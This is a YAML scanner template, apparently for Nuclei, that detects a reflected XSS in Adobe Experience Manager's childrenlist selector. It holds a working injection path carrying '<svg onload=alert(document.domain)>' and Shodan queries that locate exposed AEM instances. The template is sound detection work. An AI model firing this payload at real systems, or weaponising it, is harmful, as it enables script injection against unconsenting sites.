id: aem-xss-childlist-selector
info:
  author: dhiyaneshDk
  description: 'Requests using the selector childlist can an XSS when the dispatcher
    does not respect the content-type responded by AEM and flips from application/json
    to text/html. As a consequence the reflected suffix is executed and interpreted
    in the browser.

    '
  metadata:
    shodan-query:
    - http.title:"AEM Sign In"
    - http.component:"Adobe Experience Manager"
  name: XSS in childlist selector
  reference:
  - https://github.com/thomashartm/burp-aem-scanner/blob/master/src/main/java/burp/actions/xss/FlippingTypeWithChildrenlistSelector.java
  severity: medium
  tags: xss,aem,adobe
requests:
- matchers:
  - condition: and
    type: word
    words:
    - <svg onload=alert(document.domain)>
    - '{"path":"/etc/designs/xh1x.childrenlist.json'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html'
